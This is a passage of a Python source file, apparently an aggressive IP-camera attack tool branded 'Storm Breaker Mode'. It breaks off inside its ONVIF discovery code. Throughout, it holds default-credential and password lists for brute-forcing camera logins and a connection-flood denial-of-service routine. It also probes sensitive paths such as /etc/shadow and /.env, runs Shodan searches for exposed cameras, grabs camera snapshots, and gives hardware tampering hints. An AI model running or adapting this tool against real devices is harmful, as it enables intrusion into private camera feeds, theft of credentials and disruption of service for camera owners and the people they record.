try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    pass

import socket
import sys
import threading
import warnings
import ipaddress
import base64
import time
import os
os.environ['PYTHONIOENCODING'] = 'utf-8'

# === STORM BREAKER MODE ===
FORCE_MAX_MODE = True  # Set to True for maximum scanning

if FORCE_MAX_MODE:
    MAX_THREADS = 40
    TIMEOUT = 8
    print("⚡ STORM BREAKER MODE ACTIVATED - Maximum Aggression")

try:
    from onvif import ONVIFCamera
except ImportError:
    try:
        from onvif2 import ONVIFCamera
    except ImportError:
        try:
            from onvif.client import ONVIFCamera
        except ImportError:
            ONVIFCamera = None
            print("[!] Warning: ONVIF library not found or incompatible.")

try:
    from zeep.exceptions import Fault
except ImportError:
    Fault = Exception
import uuid
import ssl
from datetime import datetime
try:
    import shodan
except ImportError:
    shodan = None
from concurrent.futures import ThreadPoolExecutor

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

import sys
IS_ANDROID = hasattr(sys, 'getandroidapilevel') \
    or 'com.chaquo' in sys.modules.get(
        '__loader__', '').__class__.__module__ \
    if hasattr(sys.modules.get('__loader__', ''),
        '__class__') else False

# Scapy is restricted on Android (requires root for raw sockets)
try:
    from scapy.all import ARP, Ether, srp
    SCAPY_AVAILABLE = True
except (ImportError, Exception):
    SCAPY_AVAILABLE = False

# Symbols/Emojis from the screenshots
SCAN = "🔍"
OPEN = "✅"
INFO = "ℹ️"
ALRT = "⚠️"
CAM  = "📷"
STRM = "🎥"
DONE = "🏁"
ERR  = "❌"
PLD  = "📊"
KEY  = "🔑"
LOCK = "🔓"
GLOB = "🌐"
TV   = "📺"
FIRE = "🔥"
SHLD = "🛡️"
RADR = "📡"

# Comprehensive Port List (728+ tactical ports)
PORTS_LIST = (
    list(range(1, 201)) +             # Basic & Web (200)
    list(range(1024, 1101)) +         # Common Camera High Ports (77)
    list(range(5000, 5051)) +         # Synology/UPnP/Misc (51)
    list(range(8000, 8201)) +         # Hikvision/HTTP-Alt Large Range (201)
    list(range(8440, 8451)) +         # HTTPS Alts (11)
    list(range(8550, 8561)) +         # RTSP Alts (11)
    list(range(8880, 8891)) +         # Misc Alts (11)
    list(range(9000, 9151)) +         # Sony/Bosch/Generic Range (151)
    list(range(37770, 37786)) +       # Dahua Specific (16)
    [1935, 3702, 34567, 10554]        # Standard CCTV (4)
)
COMMON_PORTS = sorted(list(set(PORTS_LIST)))

PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP (Web Interface)",
    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 443: "HTTPS (Secure Web Interface)",
    554: "RTSP (Streaming)", 1883: "MQTT (Cloud Connectivity)", 1935: "RTMP", 3702: "ONVIF Discovery",
    34567: "XMEye Default", 37777: "Dahua Service", 5000: "UPnP / Synology",
    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt (Web Interface)", 8883: "MQTTS (Secure Cloud)",
    8443: "HTTPS-Alt / Cloud", 8554: "RTSP-Alt", 9000: "HTTP-Alt / Sony / Cloud"
}

# Expanded Fingerprint Database for many camera types
FINGERPRINT_PATHS = [
    "/System/configurationFile", "/ISAPI/System/deviceInfo",            # Hikvision
    "/cgi-bin/magicBox.cgi?action=getSystemInfo",                      # Dahua
    "/axis-cgi/admin/param.cgi?action=list",                           # Axis
    "/sony/info", "/media/video1",                                     # Sony
    "/nphControlCamera?Resolution=640x480",                            # Panasonic
    "/cgi-bin/admin/getparam.cgi",                                     # Vivotek
    "/control/faststream.jpg?stream=full",                             # Mobotix
    "/api.cgi?cmd=GetAbility", "/api.cgi?cmd=GetDevInfo",              # Reolink
    "/get_params.cgi", "/get_status.cgi",                              # Foscam
    "/deviceinfo", "/System/deviceInfo", "/conf", "/admin/device.php", # Generic
    "/onvif/device_service", "/onvif/Media", "/onvif/PTZ",             # ONVIF specific
    "/etc/config/image_config", "/etc/config/network_config",          # Potential backups
    "/proc/kmsg", "/var/log/messages", "/tmp/log",                     # Potential leaks
    "/shell?ls", "/cgi-bin/config.sh", "/cgi-bin/main.cgi",            # Debug/Shell
    "/system.ini?loginuse&loginpas",                                   # CamOver / GoAhead
    "/.env", "/.git/config", "/.svn/entries", "/.htaccess",            # Web Leaks
    "/phpinfo.php", "/info.php", "/status", "/config.xml",             # Server Info
    "/users.xml", "/accounts.xml", "/passwords.txt",                   # Cred leaks
    "/view/viewer_index.shtml", "/live/index.html",                    # Specific Index pages
    "/cgi-bin/get_camera_params.cgi", "/cgi-bin/get_status.cgi"         # More CCTV paths
]

# Expanded Port Service Map
PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP (Web Interface)",
    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 110: "POP3", 143: "IMAP", 443: "HTTPS (Secure)",
    554: "RTSP (Streaming)", 1883: "MQTT (Cloud)", 1935: "RTMP", 3306: "MySQL", 3389: "RDP",
    3702: "ONVIF Discovery", 5000: "UPnP / Synology", 5555: "ADB (Android Debug)",
    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt", 8081: "HTTP-Alt", 8443: "HTTPS-Alt",
    8883: "MQTTS", 8554: "RTSP-Alt", 9000: "Sony / Bosch", 34567: "XMEye Default",
    37777: "Dahua Service", 37778: "Dahua Config", 10554: "RTSP-Alt"
}

# Expanded Brand-specific prioritized credentials (100+)
BRAND_CREDENTIALS = {
    "Hikvision": [("admin", "12345"), ("admin", "abc12345"), ("admin", "admin12345"), ("admin", "12345678a"), ("admin", "hik12345"), ("admin", "Hik12345")],
    "Dahua": [("admin", "admin"), ("admin", "888888"), ("admin", "admin123"), ("666666", "666666"), ("admin", "password"), ("admin", "123456")],
    "Axis": [("root", "pass"), ("root", "root"), ("root", "axis"), ("admin", "admin"), ("root", "password")],
    "Sony": [("admin", "admin"), ("admin", ""), ("root", "root"), ("admin", "12345")],
    "Panasonic": [("admin", "12345"), ("admin", "password"), ("admin", "admin123")],
    "Foscam": [("admin", ""), ("admin", "admin"), ("admin", "123456")],
    "Reolink": [("admin", ""), ("admin", "admin")],
    "TP-Link": [("admin", "admin"), ("admin", "password"), ("admin", "12345")],
    "Wisenet": [("admin", "4321"), ("admin", "1234567")],
    "Vivotek": [("root", ""), ("root", "root"), ("admin", "admin")]
}

# Light Dictionary Mode (Top 50 common IoT/Camera passwords)
IOT_COMMON_PASSWORDS = [
    "admin", "12345", "123456", "password", "1234", "root", "admin123", "12345678",
    "guest", "user", "pass", "1111", "0000", "666666", "888888", "9999", "qwerty",
    "default", "support", "service", "camera", "operator", "supervisor", "system",
    "123456789", "123123", "admin1234", "admin888", "admin777", "admin666",
    "hik12345", "dahua123", "adminadmin", "rootroot", "meinsm", "ubnt", "microtik",
    "admin@123", "12345678a", "admin1", "12345a", "security", "master", "public",
    "private", "cisco", "login", "webcam", "video", "monitor"
]

DEFAULT_CREDENTIALS = [
    ("", ""), ("admin", ""), ("admin", "admin"), ("admin", "12345"),
    ("admin", "123456"), ("admin", "1234"), ("root", "root"), ("root", "toor"),
    ("admin", "password"), ("support", "support"), ("user", "user"), ("admin", "admin123"),
    ("admin", "12345678"), ("admin", "888888"), ("admin", "666666"), ("root", "password"),
    ("admin", "admin1234"), ("guest", "guest"), ("operator", "operator"), ("service", "service"),
    ("admin", "1111"), ("admin", "0000"), ("admin", "9999"), ("admin", "123123"),
    ("root", "pass"), ("admin", "pass"), ("admin", "admin888"), ("admin", "admin777"),
    ("admin", "smcadmin"), ("admin", "meinsm"), ("ubnt", "ubnt"), ("admin", "camera")
]

# Expanded CVE Database (Professional-Grade)
CVE_DATABASE = {
    "Axis": [
        ("CVE-2018-10660", "CRITICAL: Shell command injection in axis-cgi/param.cgi. Allows unauthenticated RCE."),
        ("CVE-2020-29550", "HIGH: Heap-based buffer overflow in the ONVIF service. Can lead to service crash or RCE."),
        ("CVE-2023-21406", "HIGH: Multiple vulnerabilities in AXIS OS allowing escalation of privileges."),
        ("CVE-2021-31986", "HIGH: Command injection in various AXIS products via firmware upgrade.")
    ],
    "Hikvision": [
        ("CVE-2017-7921", "CRITICAL: Unauthenticated bypass to view snapshots/configs. Allows full system access."),
        ("CVE-2021-36260", "CRITICAL: Command injection via web interface. Most prevalent Hikvision RCE."),
        ("CVE-2013-4977", "HIGH: RTSP overflow allowing remote code execution."),
        ("CVE-2023-28808", "MEDIUM: Improper authentication in some products allowing session hijacking."),
        ("CVE-2014-4880", "HIGH: Information disclosure via config file download."),
        ("CVE-2021-36260", "CRITICAL: Command injection vulnerability in the web server of some Hikvision IP cameras.")
    ],
    "Dahua": [
        ("CVE-2021-33044", "CRITICAL: Authentication Bypass during identity verification. Allows admin access without password."),
        ("CVE-2021-33045", "CRITICAL: Authentication Bypass during identity verification (Companion to 33044)."),
        ("CVE-2013-6117", "CRITICAL: Backdoor in older firmware. Cleartext credentials leaked on port 37777."),
        ("CVE-2022-30563", "HIGH: ONVIF implementation authentication bypass. Replay attack possible."),
        ("CVE-2017-3193", "HIGH: Buffer overflow in web management interface."),
        ("CVE-2020-25167", "MEDIUM: Weak password hashing allowing easy brute force.")
    ],
    "Sony": [
        ("CVE-2018-13271", "CRITICAL: Remote Code Execution in some IP cameras via CGI binary."),
        ("CVE-2019-15886", "HIGH: Authentication bypass allowing unauthorized settings modification."),
        ("CVE-2016-10368", "MEDIUM: Cross-site scripting (XSS) in management console.")
    ],
    "Bosch": [
        ("CVE-2021-23847", "HIGH: Memory corruption in web server leading to DoS or RCE."),
        ("CVE-2021-23848", "MEDIUM: Information disclosure through debug logs.")
    ],
    "Reolink": [
        ("CVE-2020-25169", "HIGH: Cleartext storage of sensitive information in memory."),
        ("CVE-2022-26301", "HIGH: Command injection via unauthenticated API call."),
        ("CVE-2023-46132", "CRITICAL: Multiple unauthenticated vulnerabilities in Reolink App/Client.")
    ],
    "Foscam": [
        ("CVE-2017-17020", "CRITICAL: Hardcoded root password in various models."),
        ("CVE-2018-19077", "HIGH: Command injection in web management interface.")
    ]
}

# Snapshot paths for common brands
SNAPSHOT_PATHS = [
    "/onvif-http/snapshot?Profile_1", "/ISAPI/Streaming/channels/1/picture", # Hikvision
    "/cgi-bin/snapshot.cgi", "/cgi-bin/magicBox.cgi?action=getSnapshot",     # Dahua
    "/axis-cgi/jpg/image.cgi", "/axis-cgi/mjpg/video.cgi",                   # Axis
    "/snapshot.jpg", "/snap.jpg", "/image.jpg", "/tmpfs/auto.jpg",          # Generic
    "/cgi-bin/viewer/video.jpg", "/cgi-bin/net_image.cgi",                  # Vivotek/Panasonic
    "/api/camera/snapshot", "/api/video/snapshot"                           # Modern/API
]

# Common HTTP camera paths for stream detection
HTTP_CAMERA_PATHS = [
    "/video", "/stream", "/live", "/mjpeg/video.mjpg", "/snapshot.jpg",
    "/cgi-bin/mjpg/video.cgi", "/axis-cgi/mjpg/video.cgi", "/video.cgi",
    "/videostream.cgi", "/mjpg.cgi", "/stream.cgi", "/live.cgi",
    "/cgi-bin/viewer/video.jpg", "/img/snapshot.cgi", "/cgi-bin/snapshot.cgi",
    "/video/mjpg.cgi", "/api/video", "/api/stream/live", "/api/video/live",
    "/api/live", "/api/stream", "/api/camera/video", "/mjpeg", "/videoMain",
    "/nphControlCamera", "/axis-media/media.amp"
]

def probe_rtsp(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.8)
            if s.connect_ex((ip, port)) == 0:
                s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
                response = s.recv(1024).decode(errors="ignore")
                if "RTSP/1.0" in response:
                    server = ""
                    for line in response.splitlines():
                        if line.lower().startswith("server:"):
                            server = line.split(":", 1)[1].strip()
                    return True, server
    except: pass
    return False, ""

def test_dos_resilience(ip, port):
    """Aggressive connection flood for Storm Module"""
    print(f"\n  [{FIRE}] Starting DOS_RESILIENCE on Port {port}...")

    connections = []
    try:
        for i in range(80):   # Increased from 50
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.6)
                if s.connect_ex((ip, port)) == 0:
                    connections.append(s)
            except:
                pass

        print(f"       {OPEN} Opened {len(connections)} concurrent connections")

        # Quick responsiveness check
        try:
            start = time.time()
            r = requests.get(f"http://{ip}:{port}", timeout=3, verify=False)
            latency = time.time() - start
            print(f"       {INFO} Service Latency: {latency:.2f}s")
            if latency > 2.0:
                print(f"       {ALRT} Service is slowing down under load!")
        except:
            print(f"       {FIRE} Service appears vulnerable / overwhelmed!")

    except Exception as e:
        print(f"       {ERR} Stress test error: {str(e)}")
    finally:
        for s in connections:
            try: s.close()
            except: pass

def get_physical_security_hints(brand):
    """
    Advanced Physical Security Assessment logic.
    Provides detailed intelligence on hardware-level vulnerabilities.
    """
    base_hints = [
        "Inspect for external RESET buttons on pigtail cables or under flaps.",
        "Check for unshielded SD Card slots that allow physical data extraction.",
        "Look for visible UART/Serial headers (often 4 pins) on the internal PCB.",
        "Scan for exposed USB ports used for local maintenance or firmware loading."
    ]

    brand_hints = {
        "Hikvision": [
            "Check the bottom panel for a small door; often hides the SD slot and a RESET button.",
            "HOLD RESET while powering on (30s) to force factory defaults on most models.",
            "UART Pins: VCC, RX, TX, GND (often 3.3v TTL) located near the SoC.",
            "Exposed Ethernet pigtail: Check for PoE grounding issues or physical tapping."
        ],
        "Dahua": [
            "External RESET button is frequently found on the camera pigtail or near the lens.",
            "Holding RESET during boot (10-15s) often clears the admin password.",
            "UART: Standard 4-pin header (GND, TX, RX, 3.3V) usually clearly silk-screened.",
            "Some NVRs/Cameras have a front-facing USB port that may accept auto-run firmware."
        ],
        "Axis": [
            "Check for the 'Control Button' near the SD card slot. Used for factory reset and service modes.",
            "Firmware can often be re-uploaded via the USB port on high-end dome models.",
            "Internal microSD cards may contain unencrypted video caches if not hardened."
        ],
        "Reolink": [
            "RESET button is almost always exposed on the cable harness. Extremely vulnerable.",
            "SD card slot is protected by a rubber grommet; ensure it hasn't been tampered with.",
            "Proprietary power connectors may leak data if serial-over-power is enabled."
        ],
        "Generic": [
            "Exposed pigtail cables allow for easy network tapping or hardware reset.",
            "Standard UART/Serial headers are universal for low-cost Chinese chipsets (XM, GrainMedia).",
            "Hardware Backdoors: Look for unpopulated 'J1' or 'J2' headers on the mainboard."
        ]
    }

    specific = brand_hints.get(brand, brand_hints["Generic"])
    full_assessment = "\n       ".join(base_hints + specific)
    return full_assessment

def analyze_tls(ip, port):
    """Analyzes the TLS/SSL configuration of a given port."""
    print(f"    [{SHLD}] TLS/SSL Analysis for Port {port}:")
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cipher = ssock.cipher()
                version = ssock.version()
                cert = ssock.getpeercert(binary_form=True)

                print(f"       {INFO} Protocol: {version}")
                print(f"       {INFO} Cipher: {cipher[0]} ({cipher[2]} bits)")

                if version in ["TLSv1", "TLSv1.1"]:
                    print(f"       {ALRT} VULNERABILITY: Deprecated TLS version ({version})")

                if cert:
                    x509 = ssl.DER_cert_to_PEM_cert(cert)
                    # Simple expiry check would require more deps, but we can flag self-signed/generic
                    if "OU=Root CA" in x509 or "CN=IPCamera" in x509:
                        print(f"       {ALRT} WARNING: Likely Self-Signed or Generic Certificate")
    except Exception as e:
        print(f"       {ERR} TLS Analysis Failed: {str(e)}")

def directory_enumeration(ip, port, proto, brand, auth=None):
    """Targeted directory enumeration for sensitive paths."""
    print(f"    [{RADR}] Running Targeted Directory Enumeration...")
    sensitive_paths = [
        "/php/get_system_info.php", "/system/device_info", "/proc/kmsg",
        "/config/backup.bin", "/mnt/sdcard/", "/etc/shadow", "/etc/passwd",
        "/cgi-bin/config.sh", "/cgi-bin/main.cgi?action=get_sys_info",
        "/axis-cgi/admin/param.cgi?action=list", "/ISAPI/Security/users",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo"
    ]

    found = []
    for path in sensitive_paths:
        try:
            url = f"{proto}://{ip}:{port}{path}"
            r = requests.get(url, auth=auth, timeout=2, verify=False)
            if r.status_code == 200:
                print(f"       {FIRE} EXPOSED: {url} (HTTP 200)")
                found.append(path)
            elif r.status_code == 401:
                pass # Protected, good
        except: pass
    return found

def analyze_http_port(ip, port):
    print(f"\n  {SCAN} Analyzing Port {port} ({'HTTPS' if port in [443, 8443] else 'HTTP'}):")
    try:
        proto = "https" if port in [443, 8443] else "http"
        url = f"{proto}://{ip}:{port}"
        r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)

        content_type = r.headers.get('Content-Type', 'unknown')
        server = r.headers.get('Server', 'unknown')
        status = r.status_code

        print(f"    {OPEN} Content Type: {content_type}")
        if status == 200:
            print(f"    {OPEN} Endpoint Active: {url}/ (HTTP {status})")
        print(f"    {INFO} Server: {server}")
        print(f"    {INFO} Status: {status}")

        # Extended Brand Detection in Body/Headers
        c = r.text.lower()
        s = server.lower()
        brand = "Generic"
        if "hikvision" in c or "hikvision" in s or "dvrip" in c: brand = "Hikvision"
        elif "dahua" in c or "web service" in c or "dahua" in s: brand = "Dahua"
        elif "axis" in c or "axis" in s: brand = "Axis"
        elif "sony" in c or "sony" in s: brand = "Sony"
        elif "bosch" in c or "bosch" in s: brand = "Bosch"
        elif "samsung" in c or "samsung" in s or "hanwha" in c: brand = "Samsung/Hanwha"
        elif "panasonic" in c: brand = "Panasonic"
        elif "vivotek" in c: brand = "Vivotek"
        elif "reolink" in c: brand = "Reolink"
        elif "foscam" in c: brand = "Foscam"
        elif "mobotix" in c: brand = "Mobotix"
        elif "cp plus" in c or "cpplus" in c: brand = "CP Plus"
        elif "camit" in c or "dvr" in c: brand = "Generic DVR"

        if brand != "Generic":
            print(f"    {SHLD} Brand Identified: {brand}")

        if any(x in c for x in ["login", "user", "password", "auth"]):
            print(f"    {OPEN} Login Form Detected")

        return c, brand
    except Exception as e:
        print(f"    {ERR} Connection Error: {type(e).__name__}")
        return "", "Generic"

import re

def parse_firmware_data(text, brand):
    """Attempts to extract firmware and model info using regex."""
    info = {"model": "Unknown", "firmware": "Unknown", "build": "Unknown"}

    if brand == "Hikvision":
        m = re.search(r"<model>(.*?)</model>", text, re.I)
        f = re.search(r"<firmwareVersion>(.*?)</firmwareVersion>", text, re.I)
        b = re.search(r"<firmwareReleasedDate>(.*?)</firmwareReleasedDate>", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)
        if b: info["build"] = b.group(1)
    elif brand == "Dahua":
        m = re.search(r"DeviceType=(.*?)\r\n", text, re.I)
        f = re.search(r"SoftwareVersion=(.*?)\r\n", text, re.I)
        b = re.search(r"BuildDate=(.*?)\r\n", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)
        if b: info["build"] = b.group(1)
    elif brand == "Axis":
        m = re.search(r"root.Brand.ProdFullName=(.*?)\n", text, re.I)
        f = re.search(r"root.Properties.System.Firmware.Version=(.*?)\n", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)

    # Generic extraction for common patterns
    if info["model"] == "Unknown":
        m = re.search(r"(?:model|device)[_ ]?(?:name|type)[\":= ]+([^\"<\n\r,]+)", text, re.I)
        if m: info["model"] = m.group(1).strip()
    if info["firmware"] == "Unknown":
        f = re.search(r"(?:fw|firmware|version|soft)[_ ]?(?:ver|version)[\":= ]+([^\"<\n\r,]+)", text, re.I)
        if f: info["firmware"] = f.group(1).strip()

    return info

def manual_snapshot_capture(target_ip, port, user=None, pwd=None):
    """Specific function for UI-triggered snapshot capture."""
    proto = "https" if port in [443, 8443] else "http"
    auth = (user, pwd) if user else None

    paths = [
        "/snapshot.jpg",
        "/cgi-bin/snapshot.cgi",
        "/ISAPI/Streaming/channels/101/picture",
        "/cgi-bin/viewer/video.jpg",
        "/onvif-http/snapshot?Profile_1"
    ]

    for path in paths:
        try:
            url = f"{proto}://{target_ip}:{port}{path}"
            r = requests.get(url, auth=auth, timeout=5, verify=False)
            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                # Return base64 for the UI to display
                return base64.b64encode(r.content).decode('utf-8')
        except: pass
    return None

def quick_test_url(url, timeout=5):
    """Performs a quick HTTP GET test on a URL (curl-like)."""
    try:
        if url.startswith("rtsp"):
            print(f"    📡 RTSP streams can't be tested with HTTP - try in VLC or Live View")
            return
        # Use stream=True to avoid hanging on infinite MJPEG streams
        r = requests.get(url, timeout=timeout, verify=False, stream=True)

        # We only read headers and maybe a tiny bit of content to get size if it exists
        size_kb = 0
        if 'Content-Length' in r.headers:
            size_kb = int(r.headers['Content-Length']) // 1024
        else:
            # For streams, we don't want to call r.content as it will hang
            size_kb = 0

        print(f"    ✅ {url} → HTTP {r.status_code} | Size: {size_kb}KB (reported)")
        return r.status_code
    except Exception as e:
        print(f"    ❌ {url} → Error: {type(e).__name__}")

def shodan_search(api_key, query):
    """Searches Shodan for cameras based on a query."""
    if shodan is None:
        print(f"  {ERR} Shodan library not available. Install it with 'pip install shodan'.")
        return

    print(f"\n[{GLOB}] Initiating Global Shodan Search: {query}")
    try:
        api = shodan.Shodan(api_key)
        results = api.search(query)
        print(f"  {OPEN} Total Results Found: {results['total']}")

        for result in results['matches'][:10]: # Top 10 for terminal
            ip = result['ip_str']
            port = result['port']
            org = result.get('org', 'Unknown Org')
            print(f"  {RADR} {ip}:{port} ({org})")
            if 'product' in result: print(f"     {INFO} Product: {result['product']}")
            if 'location' in result:
                loc = result['location']
                print(f"     {GLOB} Location: {loc.get('city', 'Unknown')}, {loc.get('country_name', 'Unknown')}")
    except Exception as e:
        print(f"  {ERR} Shodan Search Error: {str(e)}")

def discover_upnp_ssdp():
    """SSDP/UPnP multicast discovery - finds smart TVs, printers, cameras, routers"""
    import socket
    import re

    output = []
    output.append("📡 SSDP/UPnP Discovery Started")
    output.append("=" * 50)

    ssdp_request = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 10\r\n'
        'ST: ssdp:all\r\n'
        '\r\n'
    )

    discovered = {}

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        sock.settimeout(5)
        sock.sendto(ssdp_request.encode(), ('239.255.255.250', 1900))

        while True:
            try:
                data, addr = sock.recvfrom(4096)
                ip = addr[0]

                if ip in discovered:
                    continue  # skip duplicates

                resp = data.decode(errors='ignore')
                location = re.search(r"LOCATION:\s*(.*)\r\n", resp, re.I)
                server   = re.search(r"SERVER:\s*(.*)\r\n",   resp, re.I)
                st       = re.search(r"ST:\s*(.*)\r\n",       resp, re.I)

                discovered[ip] = True

                output.append(f"\n🔵 Device found: {ip}")
                if server:
                    output.append(f"   Server  : {server.group(1).strip()}")
                if st:
                    output.append(f"   Type    : {st.group(1).strip()}")
                if location:
                    loc_url = location.group(1).strip()
                    output.append(f"   Location: {loc_url}")

                    # Try to fetch the device description XML
                    try:
                        import urllib.request
                        with urllib.request.urlopen(loc_url, timeout=2) as r:
                            xml = r.read().decode(errors='ignore')

                        # Pull friendly name, model, manufacturer from XML
                        friendly = re.search(r"<friendlyName>(.*?)</friendlyName>", xml, re.I)
                        model    = re.search(r"<modelName>(.*?)</modelName>",       xml, re.I)
                        manuf    = re.search(r"<manufacturer>(.*?)</manufacturer>", xml, re.I)

                        if friendly: output.append(f"   Name    : {friendly.group(1).strip()}")
                        if model:    output.append(f"   Model   : {model.group(1).strip()}")
                        if manuf:    output.append(f"   Maker   : {manuf.group(1).strip()}")

                    except:
                        output.append("   (Could not fetch device details)")

            except socket.timeout:
                break  # no more responses

        sock.close()

    except Exception as e:
        return f"❌ SSDP Error: {str(e)}"

    if len(discovered) == 0:
        output.append("\n⚠️ No UPnP devices found.")
        output.append("This is normal if your router has UPnP disabled.")
    else:
        output.append(f"\n✅ Total UPnP devices found: {len(discovered)}")

    return "\n".join(output)

def get_mac_vendor(target_ip):
    """Attempts MAC lookup via ARP and identifies Vendor."""
    mac = "Unknown"
    vendor = "Unknown Vendor"
    try:
        if not IS_ANDROID and os.path.exists("/proc/net/arp"):
            # Try to read ARP table
            with open("/proc/net/arp", "r") as f:
                for line in f:
                    if target_ip in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            mac = parts[3]
                            break
    except:
        return "Unknown", "Unknown (Android restriction)"

    try:
        if mac != "Unknown" and mac != "00:00:00:00:00:00":
            # Simple offline vendor check for top camera brands
            prefix = mac.replace(":", "").upper()[:6]
            vendors = {
                "00408C": "Axis Communications", "00E04F": "Axis Communications", "ACCC8E": "Axis Communications",
                "001DFA": "Hikvision", "BCAD28": "Hikvision", "4419B6": "Hikvision", "CC6B1E": "Hikvision", "B4A382": "Hikvision",
                "000B5D": "Dahua Technology", "38AF29": "Dahua Technology", "6C1F6E": "Dahua Technology", "9002A9": "Dahua Technology",
                "00075F": "Panasonic", "0080F0": "Panasonic", "88108F": "Panasonic",
                "00032F": "Sony", "000ED9": "Sony", "28C13C": "Sony",
                "000747": "Bosch Security Systems", "000AF5": "Bosch Security Systems",
                "0002D1": "Vivotek", "0018AE": "Vivotek",
                "B0C554": "Reolink", "E0B94D": "Reolink",
                "00606E": "Foscam (Shenzhen Foscan)", "B4B362": "Foscam",
                "000325": "Mobotix",
                "000C29": "VMware (Virtual Target)", "080027": "VirtualBox (Virtual Target)"
            }
            vendor = vendors.get(prefix, "Searching online...")

            # Online fallback for more accuracy
            if vendor == "Searching online...":
                try:
                    r = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
                    if r.status_code == 200:
                        vendor = r.text
                except:
                    vendor = "Unknown (API Timeout)"

        return mac, vendor
    except:
        return "Unknown", "MAC Restricted"

def identify_device(ip):
    """Fallback identification when MAC is restricted (Android 10+)."""
    # Expanded ports for better identification
    cam_ports = {
        554: "RTSP (IP Camera)",
        3702: "ONVIF (IP Camera)",
        8000: "Hikvision",
        37777: "Dahua",
        34567: "XMEye / Generic CCTV",
        80: "HTTP",
        443: "HTTPS",
        8080: "HTTP-Alt",
        81: "HTTP-Alt",
        82: "HTTP-Alt",
        88: "HTTP-Alt",
        5000: "Synology / UPnP",
        8443: "HTTPS-Alt",
        9000: "Sony / Bosch",
        37778: "Dahua Config",
        21: "FTP (Storage)",
        23: "Telnet (Console)"
    }

    found_ports = []
    brand = "Unknown Device"
    is_camera = False

    # Fast port check
    for port, label in cam_ports.items():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1) # Very fast check for LAN
                if s.connect_ex((ip, port)) == 0:
                    found_ports.append(port)
                    if port in [554, 3702, 8000, 37777, 34567, 37778]:
                        is_camera = True
                        if port == 8000: brand = "Hikvision"
                        elif port in [37777, 37778]: brand = "Dahua"
                        elif port == 34567: brand = "XMEye Camera"
                        elif port == 554 and brand == "Unknown Device": brand = "IP Camera"
        except: pass

    # Try HTTP banner if web port is open for deeper identification
    web_ports = [p for p in found_ports if p in [80, 443, 8080, 81, 82, 88, 5000, 8443, 9000]]
    if web_ports:
        for p in web_ports:
            try:
                proto = "https" if p in [443, 8443] else "http"
                r = requests.get(f"{proto}://{ip}:{p}", timeout=0.5, verify=False, allow_redirects=True)
                server = r.headers.get("Server", "").lower()
                text = r.text.lower()

                # Check headers and body for common brands
                if any(x in server or x in text for x in ["hikvision", "hik-", "dvrip"]):
                    brand = "Hikvision"; is_camera = True; break
                elif any(x in server or x in text for x in ["dahua", "web service", "dvr-", "nvr-"]):
                    brand = "Dahua"; is_camera = True; break
                elif "axis" in server or "axis" in text:
                    brand = "Axis Camera"; is_camera = True; break
                elif "bosch" in server:
                    brand = "Bosch Camera"; is_camera = True; break
                elif "sony" in server:
                    brand = "Sony Camera"; is_camera = True; break
                elif "reolink" in text:
                    brand = "Reolink Camera"; is_camera = True; break
                elif "foscam" in text:
                    brand = "Foscam Camera"; is_camera = True; break
                elif "tplink" in text or "tapo" in text:
                    brand = "TP-Link/Tapo"; is_camera = True; break
                elif "wyze" in text:
                    brand = "Wyze Camera"; is_camera = True; break
                elif "hanwha" in text or "wisenet" in text:
                    brand = "Hanwha/Wisenet"; is_camera = True; break
            except: pass

    icon = CAM if is_camera else INFO
    display_name = f"{icon} {brand}"
    if found_ports:
        display_name += f" (Ports: {', '.join(map(str, sorted(found_ports[:3])))})"

    # If it's a router
    if brand == "Unknown Device" and (ip.endswith(".1") or ip.endswith(".254")):
        display_name = f"🏠 Gateway / Router"

    return display_name

import json

# Global storage for Storm results
storm_results = []

def get_storm_results():
    return json.dumps(storm_results)

def clear_storm_results():
    global storm_results
    storm_results = []
    return "Results Cleared"

def discover_onvif(target_ip):
    """
    Attempts to discover ONVIF details for a specific IP.
    Uses WS-Discovery and direct service probing.
    """
    print(f"\n  [{RADR}] Probing ONVIF Services for {target_ip}:")

    try:
        if ONVIFCamera is None:
            print(f"    {RADR} Using lightweight ONVIF probe (Android compatible mode)")
            print(onvif_probe(target_ip))
            return

        # 1. WS-Discovery (Unicast Probe)
        ws_discovery_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
                    xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                    xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
